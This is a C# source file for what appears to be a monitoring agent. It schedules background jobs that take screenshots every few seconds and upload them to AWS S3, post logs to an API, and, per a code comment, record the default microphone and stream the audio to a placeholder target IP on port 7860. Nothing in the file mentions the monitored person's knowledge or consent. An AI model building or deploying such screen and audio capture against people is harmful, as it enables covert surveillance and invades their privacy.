using SLA_Remake.Models;
using System;
using System.Collections.Generic;
using System.Linq;

namespace SLA_Remake;

public static class Jobs
{
	// This class contains all the required jobs
	// that are to be executed in the background

	private static readonly Random _random = new();
	private static readonly List<Tuple<Action, Func<TimeSpan>>> Workflows =
	[
		new(PostmanJob, () => TimeSpan.FromSeconds(17)),
		//new(CameramanJob, () => TimeSpan.FromMinutes(_random.Next(5, 15))),
		new(CameramanJob, () => TimeSpan.FromSeconds(_random.Next(5, 15))),
		new(BroadcasterJob, () => TimeSpan.FromMinutes(1)),
	];

	// Jobs
	// ----

	private static void PostmanJob()
	{
		// Responsibility:
		// ---------------
		// Postman's Job is to send all the saved logs to the API
		// and then, clear the respective local SQLite3 Database.

		if (!Configuration.EnableLoggingOnAPI) return;
		if (!WebAPI.ConnectedToInternet()) return;

		PostEntries<LogEntry>();
		PostEntries<ScreenshotEntry>();
	}

	private static void CameramanJob()
	{
		// Responsibility:
		// ---------------
		// Cameraman's Job is to capture screenshots and save them locally
		// and then, try to upload all the screenshots to AWS S3, and make
		// keys. Then save the keys obtained in the Local SQLite3 Database

		try
		{
			CrossUtility.CaptureAndSaveScreenshot();
		}
		catch
		{
			// There are certain cases, when the screenshot cannot be captured
			// i.e., when a different user is logged in, while current user is
			// active. In such case, exception is thrown, which can be ignored
		}

		if (!Configuration.EnableCacheLogging) return;
		if (!WebAPI.ConnectedToInternet()) return;

		var keys = WebAPI.AWS.UploadScreenshotsFrom(Configuration.Screenshots.Route);
		if (keys.Count == 0) return;

		var log = keys.Select(ScreenshotEntry.Create);
		var res = Database<ScreenshotEntry>.Save(log);
	}

	private static void BroadcasterJob() 

		// Responsibility:
		// ---------------
		// Broadcaster's Job is to;
		// - Record Audio Data, from the Default Microphone
		// - Compress it in mp3 format for better streaming
		// - Start Streaming it to the <target-ip> at :7860
		// - In-case of an interruption resend after <time>
		
		=> CrossUtility.RecordAndStreamAudioData();

	// Utilities
	// ---------

	public static void Launch() => Workflows.ForEach(RegisterJob);

	private static void RegisterJob(Tuple<Action, Func<TimeSpan>> JobInfo)
	{
		var (Job, GetInterval) = JobInfo;
		System.Threading.Tasks.Task.Run(async () =>
		{
			while (true) 
			{
				try
				{
					await System.Threading.Tasks.Task.Delay(GetInterval());
					Job();
				}
				catch (Exception x)
				{
					WebAPI.RegisterException(x);
				}
			}
		});
	}

	// Helper Methods
	// --------------

	private static void PostEntries<T>() where T : class
	{
		if (!WebAPI.VerifyDatabase()) return;
		var entries = Database<T>.GetSavedEntries();

		if (entries.Count == 0) return;
		var success = WebAPI.SendEntries(entries);

		if (!success) return;
		Database<T>.Clear();
	}
}